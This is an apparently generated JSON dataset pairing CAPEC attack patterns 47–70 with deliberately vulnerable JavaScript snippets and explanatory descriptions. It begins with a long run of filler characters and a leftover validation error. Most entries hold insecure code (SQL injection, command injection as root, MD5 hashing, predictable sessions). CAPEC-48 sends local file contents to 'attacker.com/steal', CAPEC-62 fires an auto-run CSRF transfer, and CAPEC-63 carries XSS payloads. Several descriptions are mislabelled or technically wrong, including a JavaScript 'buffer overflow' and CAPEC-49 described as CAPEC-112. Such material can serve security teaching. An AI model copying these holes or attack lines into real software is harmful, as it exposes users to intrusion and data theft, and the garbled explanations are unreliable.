AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}. Got: 1 validation error for CodeSnippet\ndescription\n  field required (type=value_error.missing)"
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new Array(10).fill('');\n  let expandedInput = input.repeat(2); // Simulate parameter expansion\n  for (let i = 0; i < expandedInput.length; i++) {\n    buffer[i] = expandedInput[i]; // Potential buffer overflow\n  }\n  return buffer.join('');\n}\n\n// Example usage\nlet userInput = '1234567890';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerableFunction` takes an input string and expands it by repeating it twice. It then attempts to copy the expanded input into a fixed-size buffer of 10 elements. If the expanded input exceeds the buffer size, it will cause a buffer overflow. This example embodies the main idea of the CAPEC by showing how input expansion can lead to a buffer overflow when the software fails to anticipate the increased size. The related CWEs are represented by the improper handling of buffer sizes and lack of input validation."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchResource(url) {\n  if (url.startsWith('file://')) {\n    fetch(url)\n      .then(response => response.text())\n      .then(data => {\n        // Send the local file content to an external server\n        fetch('https://attacker.com/steal', {\n          method: 'POST',\n          headers: {'Content-Type': 'application/json'},\n          body: JSON.stringify({fileContent: data})\n        });\n      })\n      .catch(error => console.error('Error fetching local file:', error));\n  } else {\n    console.error('Invalid URL scheme');\n  }\n}\n\n// Example usage\nfetchResource('file:///C:/Users/username/Documents/sensitive.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a function fetchResource is designed to fetch resources based on a given URL. If the URL starts with 'file://', indicating a local file, the function fetches the file's content and sends it to an external server controlled by an attacker. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' by exploiting the browser's authority to access local files. The code also touches on related CWEs: CWE-241 (Improper Handling of Unexpected Data Type) by not validating the URL properly, CWE-706 (Use of Incorrectly-Resolved Name or Reference) by resolving local file paths, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by potentially exposing sensitive data through the fetch request."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password123' }; // CWE-521: Weak Password Requirements\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const currentTime = Date.now();\n  const userAttempts = loginAttempts[username] || { count: 0, lastAttempt: 0 };\n\n  if (currentTime - userAttempts.lastAttempt < 3000) { // 3 seconds lockout period\n    return res.status(429).send('Too many attempts, please try again later.');\n  }\n\n  if (users[username] && users[username] === password) {\n    loginAttempts[username] = { count: 0, lastAttempt: currentTime };\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username] = { count: userAttempts.count + 1, lastAttempt: currentTime };\n    return res.status(401).send('Invalid username or password');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It embodies the main idea of CAPEC-112 (Password Brute Forcing) by demonstrating how weak password requirements (CWE-521) and improper restriction of excessive authentication attempts (CWE-307) can make the system vulnerable to brute force attacks. The code uses a hardcoded weak password and does not implement strong measures to prevent multiple failed login attempts within a short time frame, making it susceptible to brute force attacks. The lockout period is set to a very short duration (3 seconds), which is insufficient to prevent brute force attempts effectively."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "const users = { 'user1': { 'password': 'password123', 'securityQuestion': 'petName', 'securityAnswer': 'fluffy' } }; \n\nfunction recoverPassword(username, answer) { \n  if (users[username] && users[username].securityAnswer === answer) { \n    return users[username].password; \n  } else { \n    return 'Security answer incorrect'; \n  } \n} \n\nconsole.log(recoverPassword('user1', 'fluffy')); // Outputs: password123",
        "description": "This JavaScript code snippet demonstrates a weak password recovery mechanism. It stores user passwords in plaintext and uses a simple security question for password recovery. If an attacker knows or guesses the answer to the security question, they can retrieve the user's password. This example embodies the CAPEC of 'Password Recovery Exploitation' and highlights related CWEs such as 'Insufficiently Protected Credentials' (CWE-522), 'Weak Password Recovery Mechanism for Forgotten Password' (CWE-640), and 'Storing Passwords in a Recoverable Format' (CWE-257). The code is vulnerable because it does not securely handle password storage or recovery, making it easy for attackers to gain unauthorized access."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {};\n\n// Improper Authorization (CWE-285)\napp.post('/register', (req, res) => {\n  const { serviceName, serviceUrl } = req.body;\n  registry[serviceName] = serviceUrl;\n  res.send('Service registered');\n});\n\n// Cleartext Storage in the Registry (CWE-314)\napp.get('/lookup/:serviceName', (req, res) => {\n  const serviceUrl = registry[req.params.serviceName];\n  if (serviceUrl) {\n    res.send(`Service URL: ${serviceUrl}`);\n  } else {\n    res.status(404).send('Service not found');\n  }\n});\n\n// Exposure of WSDL File Containing Sensitive Information (CWE-651)\napp.get('/wsdl/:serviceName', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <service name=\"${req.params.serviceName}\">\n    <documentation>WSDL for ${req.params.serviceName}</documentation>\n  </service>\n</definitions>`;\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('Registry service running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic web service registry using Express.js. It demonstrates several vulnerabilities related to the 'Poison Web Service Registry' CAPEC and associated CWEs:\n\n1. **Improper Authorization (CWE-285)**: The `/register` endpoint allows any client to register a service without any authorization checks, making it possible for an attacker to register malicious services.\n\n2. **Cleartext Storage in the Registry (CWE-314)**: The service URLs are stored in cleartext within the `registry` object, which can be easily accessed and manipulated.\n\n3. **Exposure of WSDL File Containing Sensitive Information (CWE-651)**: The `/wsdl/:serviceName` endpoint exposes a WSDL file for any registered service, potentially leaking sensitive information about the service's interface and usage.\n\nThe code represents the main idea of the CAPEC by showing how a web service registry can be poisoned through improper authorization, cleartext storage, and exposure of sensitive information, leading to potential redirection to malicious services and other security issues."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  if (!filePath) {\n    throw new Error('File path is required');\n  }\n\n  // Vulnerable to null byte injection\n  fs.readFile(filePath + '\\0.txt', 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('example');",
        "description": "This JavaScript code snippet demonstrates a vulnerability to null byte injection. The `readFile` function takes a file path as input and attempts to read the file. However, it appends a null byte ('\\0') to the file path, which can cause the file system to terminate the string early, potentially leading to reading an unintended file. This embodies the CAPEC concept of 'Embedding NULL Bytes' and is related to CWE-158 (Improper Neutralization of Null Byte or NUL Character). The code does not properly handle or neutralize the null byte, leading to potential security issues."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function isValidPath(input) {\n  // Check if the input ends with a slash\n  if (input[input.length - 1] !== '/') {\n    return false;\n  }\n  // Remove null bytes from the input\n  let sanitizedInput = input.replace(/\\0/g, '');\n  // Check if the sanitized input still ends with a slash\n  return sanitizedInput[sanitizedInput.length - 1] === '/';\n}\n\n// Example usage\nlet userInput = \"valid/path\\0/invalid\";\nconsole.log(isValidPath(userInput)); // false\nuserInput = \"valid/path/\";\nconsole.log(isValidPath(userInput)); // true",
        "description": "This JavaScript code snippet defines a function `isValidPath` that checks if a given input string ends with a slash ('/'). The function first checks if the last character of the input is a slash. If not, it returns false. It then removes any null bytes ('\\0') from the input and checks again if the sanitized input ends with a slash. This demonstrates the vulnerability described in the CAPEC by showing how an attacker could bypass the initial check by inserting a null byte before the final slash. The code also highlights the importance of proper input validation and neutralization of special characters, as described in the related CWEs."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.get('/search', (req, res) => {\n  const searchTerm = req.query.q;\n  const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a route '/search' that takes a query parameter 'q' from the URL and uses it to search the 'users' table in the database. The query is constructed using string interpolation, which makes it vulnerable to SQL Injection (CWE-89). Additionally, the error message returned to the client includes sensitive information (CWE-209). The use of the GET method with sensitive query strings (CWE-598) and improper neutralization of special elements in the SQL query (CWE-943) are also demonstrated. This code embodies the main idea of CAPEC-166, where an adversary can probe the application's structure and robustness by submitting crafted queries and examining the responses."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak password hashing function\nfunction hashPassword(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n\n// Simulated database of user passwords\nlet userDatabase = {\n  'user1': hashPassword('password123'), // Weak password\n  'user2': hashPassword('123456'), // Weak password\n};\n\n// Function to simulate an attacker using a rainbow table\nfunction rainbowTableAttack(hash) {\n  const rainbowTable = {\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    'e10adc3949ba59abbe56e057f20f883e': '123456'\n  };\n  return rainbowTable[hash] || null;\n}\n\n// Attacker tries to crack the password hashes\nfor (let user in userDatabase) {\n  let crackedPassword = rainbowTableAttack(userDatabase[user]);\n  if (crackedPassword) {\n    console.log(`Password for ${user} is ${crackedPassword}`);\n  } else {\n    console.log(`Password for ${user} could not be cracked`);\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a weak password hashing mechanism using MD5, which is vulnerable to rainbow table attacks. The `hashPassword` function hashes passwords using MD5, a weak hashing algorithm (CWE-916). The `userDatabase` object simulates a database of users with weak passwords (CWE-521). The `rainbowTableAttack` function simulates an attacker using a precomputed rainbow table to crack the password hashes. The code iterates over the user database and attempts to crack each password hash using the rainbow table. This example highlights the vulnerabilities associated with weak password hashing and the use of weak passwords, making it easier for attackers to compromise user accounts (CAPEC-261, CWE-521)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "function authenticateUser(token) {\n  // Client-side token validation (CWE-602)\n  if (token === 'valid-token') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction accessProtectedResource(token) {\n  if (authenticateUser(token)) {\n    console.log('Access granted to protected resource.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulating a capture-replay attack (CWE-294)\nconst capturedToken = 'valid-token';\naccessProtectedResource(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and access control. The `authenticateUser` function checks if a provided token matches a hardcoded 'valid-token' string, representing a simplistic and insecure client-side enforcement of server-side security (CWE-602). The `accessProtectedResource` function grants or denies access based on the result of `authenticateUser`. The code also simulates a capture-replay attack (CWE-294) by using a previously captured valid token to gain unauthorized access to a protected resource. This example embodies the main idea of the deprecated CAPEC pattern by showing how removing or short-circuiting guard logic can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst http = require('http');\n\napp.get('/sensitive', (req, res) => {\n  const sensitiveData = req.query.token; // CWE-598: Sensitive data in query string\n  if (!sensitiveData) {\n    return res.status(400).send('Token is required');\n  }\n\n  // CWE-287: Improper Authentication\n  if (sensitiveData !== 'expectedToken') {\n    return res.status(403).send('Forbidden');\n  }\n\n  // CWE-642: External Control of Critical State Data\n  const userData = { userId: req.query.userId, role: 'admin' };\n  res.send(`Sensitive data for user ${userData.userId}`);\n});\n\nhttp.createServer(app).listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a RESTful API endpoint using the Express framework. The endpoint '/sensitive' processes GET requests and expects a sensitive token in the query string, which is a security flaw (CWE-598). The code attempts to authenticate the user based on the token but does so improperly (CWE-287). Additionally, it constructs user data based on query parameters, which can be controlled externally (CWE-642). This setup demonstrates how a RESTful application can trust system resources and environment improperly, leading to potential exposure of sensitive data once SSL is terminated, aligning with the CAPEC description."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// Dummy user data\nconst users = [\n  { id: 1, name: 'Alice', role: 'user' },\n  { id: 2, name: 'Bob', role: 'admin' }\n];\n\n// Dummy data\nlet data = [\n  { id: 1, content: 'Public Data' },\n  { id: 2, content: 'Sensitive Data' }\n];\n\n// Middleware to simulate authentication\napp.use((req, res, next) => {\n  req.user = users[0]; // Simulate that Alice is always the logged-in user\n  next();\n});\n\n// Vulnerable endpoint\napp.get('/data/:id', (req, res) => {\n  const dataId = parseInt(req.params.id);\n  const item = data.find(d => d.id === dataId);\n  if (item) {\n    res.json(item);\n  } else {\n    res.status(404).send('Data not found');\n  }\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a vulnerable endpoint that demonstrates the 'Restful Privilege Elevation' attack. The server has a hardcoded user (Alice) who is always authenticated, and it exposes a GET endpoint to fetch data by ID. The endpoint does not perform any authorization checks to ensure that the authenticated user has the right to access the requested data. This lack of proper access control (CWE-285) and the assumption that GET requests are safe (CWE-650) can allow an attacker to access sensitive data they should not have access to. The code represents the main idea of the CAPEC by showing how improper privilege management and unsafe actions can lead to unauthorized data access."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\n// Simulate a weak session ID generator\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 10000).toString(); // CWE-330: Use of Insufficiently Random Values\n}\n\napp.use((req, res, next) => {\n  if (!req.cookies.sessionID) {\n    const sessionID = generateSessionID();\n    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true }); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n  }\n  next();\n});\n\napp.get('/login', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    // Simulate a session fixation vulnerability\n    res.send(`Logged in with session ID: ${sessionID}`); // CWE-384: Session Fixation\n  } else {\n    res.status(401).send('Unauthorized'); // CWE-285: Improper Authorization\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js with a vulnerable session management system. The `generateSessionID` function creates a weak session ID using insufficiently random values (CWE-330). The session ID is stored in a persistent cookie (CWE-539), which can be easily predicted or intercepted. The `/login` route demonstrates a session fixation vulnerability (CWE-384) by not invalidating existing session IDs upon login. This setup allows an attacker to predict or hijack session IDs, leading to unauthorized access (CWE-285). The code embodies the main idea of CAPEC-139: 'Session Credential Falsification through Prediction' by showcasing how predictable session IDs can be exploited for spoofing and session hijacking."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Simulated user session store\nlet sessions = {};\n\napp.post('/login', (req, res) => {\n  const userId = authenticateUser(req.body.username, req.body.password);\n  if (userId) {\n    const sessionId = generateSessionId();\n    sessions[sessionId] = { userId, createdAt: Date.now() };\n    res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.get('/secure-data', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessions[sessionId] && isValidSession(sessions[sessionId])) {\n    res.send('Sensitive data');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nfunction authenticateUser(username, password) {\n  // Dummy authentication\n  return username === 'user' && password === 'pass' ? 1 : null;\n}\n\nfunction generateSessionId() {\n  return Math.random().toString(36).substring(2);\n}\n\nfunction isValidSession(session) {\n  // Check if session is older than 30 minutes\n  return (Date.now() - session.createdAt) < 1800000;\n}\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet represents a simple Express.js application that demonstrates the concept of session management and the potential for session replay attacks. The application has a login endpoint that authenticates a user and generates a session ID, which is stored in a cookie. The '/secure-data' endpoint checks if the session ID from the cookie is valid before providing access to sensitive data. The code highlights several CWE-related issues: it does not invalidate old sessions (CWE-384), uses cookies to store session IDs (CWE-539), and does not sufficiently protect against session replay attacks (CWE-294). The 'isValidSession' function checks if the session is older than 30 minutes, but this is a simplistic approach and does not fully mitigate the risk of session replay attacks."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate user login\n  req.session.user = 'authenticatedUser';\n  res.send('User logged in');\n});\n\napp.get('/secure', (req, res) => {\n  if (req.session.user) {\n    res.send('Access to secure resource');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The session is initialized with a fixed secret key and does not invalidate the session identifier upon user authentication. This setup is vulnerable to session fixation attacks (CAPEC-384) because an attacker can induce a client to use a session identifier provided by the attacker. Once the user logs in, the attacker can use the same session identifier to gain unauthorized access to privileged resources. The code also demonstrates CWE-664 (Improper Control of a Resource Through its Lifetime) by not properly managing the session lifecycle, CWE-732 (Incorrect Permission Assignment for Critical Resource) by not securing the session cookie, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to maintain session security."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "function performCSRF() {\n  var img = new Image();\n  img.src = 'http://victim.com/transfer?amount=1000&to=attacker';\n}\n\n// Automatically execute the CSRF attack when the page loads\nwindow.onload = performCSRF;",
        "description": "This JavaScript code snippet demonstrates a basic Cross-Site Request Forgery (CSRF) attack. The function `performCSRF` creates a new Image object and sets its `src` attribute to a URL that performs a sensitive action (e.g., transferring money) on the victim's website. When the image is loaded, the browser sends a GET request to the specified URL, including any session cookies that the user has for the victim's site. This request is made without the user's explicit consent, leveraging the user's authenticated session to perform actions on their behalf. The `window.onload` event ensures that the CSRF attack is executed as soon as the page loads. This code snippet embodies the main idea of CAPEC-352 by exploiting the implicit trust placed in user session cookies and the lack of sufficient request verification. It also touches on related CWEs such as missing authentication for critical functions (CWE-306) and improper control of resources (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<h2>Comment Section</h2>\n<form action=\"/submit_comment\" method=\"post\">\n  <label for=\"comment\">Comment:</label><br><br>\n  <textarea id=\"comment\" name=\"comment\" rows=\"4\" cols=\"50\"></textarea><br><br>\n  <input type=\"submit\" value=\"Submit\">\n</form>\n\n<div id=\"comments\">\n  <h3>Previous Comments:</h3>\n  <div id=\"comment1\">User1: <script>alert('XSS Attack!');</script></div>\n  <div id=\"comment2\">User2: <img src=\"x\" onerror=\"alert('XSS via IMG!')\"></div>\n</div>\n\n</body>\n</html>",
        "description": "This JavaScript code snippet represents a vulnerable web page that allows users to submit comments. The comments are displayed without proper input validation or neutralization, making the page susceptible to Cross-Site Scripting (XSS) attacks. The 'comment1' div demonstrates an XSS attack using a script tag, while the 'comment2' div shows an XSS attack using an IMG tag with an onerror attribute. These examples highlight the vulnerabilities described in the related CWEs, such as improper neutralization of input (CWE-79), improper input validation (CWE-20), and improper neutralization of script in attributes of IMG tags (CWE-82)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let pathname = decodeURIComponent(parsedUrl.pathname);\n\n  // Vulnerable path validation\n  if (pathname.startsWith('/admin')) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server parses incoming URL requests and decodes the URL-encoded components. It then checks if the decoded pathname starts with '/admin' to restrict access. However, this code is vulnerable to attacks where an attacker can use alternate encodings or multiple encodings to bypass the validation logic. For example, an attacker could use '%2fadmin' or other encoded variations to bypass the check and gain unauthorized access. This snippet embodies the main idea of CAPEC-147: 'Using Slashes and URL Encoding Combined to Bypass Validation Logic', and highlights related weaknesses such as improper handling of URL encoding (CWE-177), improper input validation (CWE-20), and path traversal (CWE-22)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "const http = require('http');\n\nhttp.get('http://example.com/update.js', (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Execute the downloaded code\n  });\n}).on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an application downloads and executes code from a remote server without verifying its integrity or using encryption. The `http.get` method fetches a JavaScript file from 'http://example.com/update.js' over an unencrypted HTTP connection, making it susceptible to sniffing attacks (CWE-319, CWE-311). The downloaded code is then executed using `eval`, which can lead to the execution of malicious code if the integrity of the downloaded code is compromised (CWE-494). This snippet embodies the main idea of the CAPEC 'Sniff Application Code' by illustrating how an adversary could capture and exploit application code transmitted in cleartext."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send('Internal Server Error');\n      console.error('Error executing query:', error);\n      return;\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic SQL Injection vulnerability in a Node.js application using the Express framework and MySQL database. The application constructs an SQL query using user input directly from the query string parameter 'id' without proper validation or sanitization. This allows an attacker to manipulate the SQL query by injecting malicious SQL code. The code also includes an error handling mechanism that logs the error, which could potentially expose sensitive information if not handled properly. This example embodies the main idea of CAPEC-66 (SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-1286 (Improper Validation of Syntactic Correctness of Input), and CWE-209 (Generation of Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "const syslog = require('syslog-client');\n\nfunction logMessage(userInput) {\n    // CWE-134: Use of Externally-Controlled Format String\n    // CWE-20: Improper Input Validation\n    // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n    // CWE-120: Buffer Copy without Checking Size of Input\n    // CWE-680: Integer Overflow to Buffer Overflow\n    // CWE-697: Incorrect Comparison\n    const client = syslog.createClient('localhost');\n    client.log(userInput); // Vulnerable to format string injection\n}\n\n// Example usage\nconst userInput = '%x %x %x %x'; // Malicious input\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable use of the syslog() function, which is the main idea of the CAPEC. The function logMessage() takes user input and logs it using the syslog-client library without proper validation or sanitization. This can lead to a format string injection attack, where an attacker can inject malicious format string commands. The code is vulnerable to several CWEs: CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-120 (Buffer Copy without Checking Size of Input), CWE-680 (Integer Overflow to Buffer Overflow), and CWE-697 (Incorrect Comparison). The example usage shows how an attacker might exploit this vulnerability by passing a malicious format string."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (CWE-328)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate missing cryptographic step (CWE-325)\nfunction signCode(data, privateKey) {\n  // Missing step: should use a secure hash function and proper signing algorithm\n  const hash = generateWeakHash(data);\n  return crypto.privateEncrypt(privateKey, Buffer.from(hash));\n}\n\n// Simulate subverting code-signing (CAPEC-243)\nfunction verifyCodeSignature(data, signature, publicKey) {\n  const hash = generateWeakHash(data);\n  const decryptedHash = crypto.publicDecrypt(publicKey, signature).toString('hex');\n  return hash === decryptedHash;\n}\n\n// Example usage\nconst privateKey = 'privateKeyExample'; // Simplified for example\nconst publicKey = 'publicKeyExample'; // Simplified for example\nconst code = 'console.log(\"Hello, world!\");';\nconst signature = signCode(code, privateKey);\n\nif (verifyCodeSignature(code, signature, publicKey)) {\n  console.log('Code signature verified. Executing code...');\n  eval(code); // Dangerous: executing potentially untrusted code\n} else {\n  console.log('Code signature verification failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a subversion of code-signing facilities (CAPEC-243) by using a weak hash function (CWE-328) and omitting necessary cryptographic steps (CWE-325). The `generateWeakHash` function uses the MD5 algorithm, which is known to be weak and vulnerable to collisions. The `signCode` function simulates signing code but uses the weak hash and a simplified encryption method, missing critical cryptographic steps. The `verifyCodeSignature` function checks the signature against the weak hash, allowing an attacker to potentially forge signatures. The example usage shows how this flawed verification can lead to the execution of potentially malicious code using `eval`, highlighting the risks of subverting code-signing mechanisms."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction runCommand(userInput) {\n  // CWE-250: Execution with Unnecessary Privileges\n  if (process.getuid() === 0) { // Check if running as root\n    // CWE-78: OS Command Injection\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  } else {\n    console.log('This operation requires elevated privileges.');\n  }\n}\n\n// CWE-15: External Control of System or Configuration Setting\nconst userCommand = process.argv[2];\nrunCommand(userCommand);",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where a program running with elevated privileges (root) executes a command based on user input. The `runCommand` function checks if the process is running as root (CWE-250: Execution with Unnecessary Privileges) and then uses the `exec` function to run the user-provided command (CWE-78: OS Command Injection). The user input is taken directly from the command line arguments (CWE-15: External Control of System or Configuration Setting), making it susceptible to malicious input. This code embodies the main idea of the CAPEC by showing how an attacker could exploit a program running with elevated privileges to execute arbitrary commands."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const defaultCredentials = [\n  { username: 'admin', password: 'admin' },\n  { username: 'user', password: 'password' },\n  { username: 'root', password: 'root' }\n];\n\nfunction authenticate(username, password) {\n  for (let cred of defaultCredentials) {\n    if (cred.username === username && cred.password === password) {\n      return true; // Authentication successful\n    }\n  }\n  return false; // Authentication failed\n}\n\n// Example usage\nconst username = 'admin';\nconst password = 'admin';\n\nif (authenticate(username, password)) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
